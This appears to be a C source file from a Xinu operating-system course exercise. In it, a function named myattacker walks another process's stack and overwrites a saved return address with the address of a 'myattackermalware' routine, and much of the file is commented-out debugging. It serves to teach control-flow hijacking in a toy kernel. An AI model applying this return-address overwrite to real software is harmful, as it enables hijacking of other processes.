#include <xinu.h>
#include <stdio.h>


extern void myvictim(void);
extern void func1(void);
extern void func2(void);
extern void myattackermalware(void);
extern syscall stacktrace(int);


void myattacker(){
	


	/*unsigned long * victimaddress = (unsigned long*)&myvictim;
	unsigned long * attackaddress = (unsigned long*)&myattackermalware;*/

	//unsigned long * fp = (unsigned long *)proc->prstkbase;

	
	//stacktrace(currpid-1);
	struct procent	*proc = &proctab[currpid-1];
	
	//printf("---------Process ID is : %d\n , Myvictimglobal is : %d \n", currpid-1,1);
	//*(int *)(proctab[currpid-1].prstkbase - 88) = myattackermalware;
	//kprintf("attacker address is close to (%08X) %08X (%d) \n\n\n",attackmalware,*attackmalware,*attackmalware);
	unsigned long * fp = (unsigned long *)proc->prstkbase;
	unsigned long * tmp;
	tmp = fp;
	*(unsigned long *)*(proc->prstkbase-1)= myattackermalware;
	//*(fp-1) = myattackermalware;
	
	/*while(fp!=tmp-30){
		kprintf("(%08x) %08x \n", fp, *fp);
		fp--;
	}*/



	while(*--fp != tmp){
		;
	}
	tmp = fp;

	// while(*--fp != tmp){
	// 	;
	// }
	// tmp = fp;
	// while(*--fp != tmp){
	// 	;
	// }

	fp++;
	*fp=myattackermalware;

	kprintf("\nffff\n");
	fp=(unsigned long *)proc->prstkbase;
	tmp = fp;
	while(fp != tmp-30){
		kprintf("(%08x) %08x \n", fp, *fp);
		fp--;
	}


	//*(fp+1) = myattackermalware;
	kprintf("done!\n");
	return;

	
	//unsigned long * victimaddress = (unsigned long*)&myvictim;
	/*unsigned long * retfunc1 = (unsigned long*)&func1;
	unsigned long * retfunc2 = (unsigned long*)&func2;
	unsigned long * attackaddress = (unsigned long*)&myattackermalware;

	kprintf("victim address is close to (%08X)\n",myvictim);
	kprintf("func1 address is close to (%08X) \n",retfunc1);
	kprintf("func2 address is close to (%08X) \n",retfunc2);*/

	//unsigned long * off = fp - retfunc1;

	


	//printf(" offset in INT is (%d)\n",*off);

	//stacktrace(currpid-1); 

	//printf("Myattackadd is (%08X) \n",&attackaddress);

	

	

	//unsigned long * fp = (unsigned long *)proc->prstkbase;
	//unsigned long * sp = (unsigned long *)proc->prstkptr;
	
	//*(fp+12) = (int)myattackermalware + 6;
	//*(int *)(fp - 92) = myattackermalware + 1000;*/
	
}
